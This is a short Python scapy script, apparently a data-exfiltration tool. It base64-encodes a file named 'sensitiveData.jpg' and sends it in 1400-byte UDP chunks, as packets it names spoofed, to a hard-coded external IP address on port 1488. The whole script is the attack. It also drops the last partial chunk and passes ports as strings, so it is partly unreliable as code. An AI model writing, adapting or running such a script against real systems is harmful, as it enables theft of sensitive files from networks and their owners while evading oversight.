from scapy.all import *
import base64
import math

packetSize = 1400
SrcIP = '192.168.27.4'
DstIP = '37.46.85.25'
SrcMac = '08:00:27:27:1e:9b'
DstMac = '4c:5e:0c:5d:1a:53'
SrcPort = '62546'
DstPort = '1488'

file = open('sensitiveData.jpg', 'rb')
content = base64.b64encode(file.read())
file.close()

for i in range(math.floor(len(content)/packetSize)):
	payload = content[i*packetSize:(i+1)*packetSize]
	spoofed_packet = Ether(src=SrcMac, dst=DstMac) / IP(src=SrcIP, dst=DstIP) / UDP(sport=SrcPort, dport=DstPort) / payload
	sendp(spoofed_packet)